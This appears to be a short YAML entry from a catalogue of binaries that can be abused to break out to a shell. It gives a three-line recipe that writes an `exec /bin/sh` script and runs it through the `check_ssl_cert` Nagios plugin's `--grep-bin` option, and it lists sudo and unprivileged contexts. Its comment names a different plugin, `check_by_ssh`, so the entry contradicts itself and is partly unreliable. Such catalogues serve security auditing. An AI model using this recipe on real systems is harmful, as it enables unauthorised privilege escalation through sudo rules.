---
comment: |-
  This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
functions:
  shell:
  - code: |-
      echo 'exec /bin/sh 0<&2 1>&2' >x
      chmod +x x
      check_ssl_cert --grep-bin ./x -H x
    comment: |-
      The shell will be invoked multiple times.
    contexts:
      sudo:
      unprivileged:
...
